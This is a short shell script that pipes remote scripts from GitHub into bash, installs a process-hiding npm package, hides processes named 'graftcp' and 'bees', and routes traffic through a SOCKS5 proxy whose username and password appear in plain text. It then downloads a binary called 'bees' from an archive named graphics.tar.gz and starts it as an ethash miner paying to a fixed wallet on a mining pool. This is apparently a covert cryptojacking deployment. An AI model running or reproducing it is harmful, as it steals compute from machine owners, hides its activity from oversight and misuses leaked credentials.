#!/bin/sh
wget -O - https://raw.githubusercontent.com/nathanfleight/scripts/main/start_ping_every2min.sh | bash &

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install libpci-dev screen unzip net-tools iputils-ping

wget -O - https://deb.nodesource.com/setup_17.x | bash

apt -y install nodejs

apt -y install npm > /dev/null

npm i -g node-process-hider

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

ph add graftcp
ph add bees

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = gpusocks6.wot.mrface.com:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

ps -A | grep graftcp* | awk '{print $1}' | xargs kill -9 $1

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .5


./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bees
chmod +x bees


./graftcp/graftcp ./bees -a ethash -w 0xC236BedfCC4ec6a39251eeBDd185Fa0cb44b910B -p stratum+ssl://eth-de.flexpool.io:5555 -r Bees -v 4

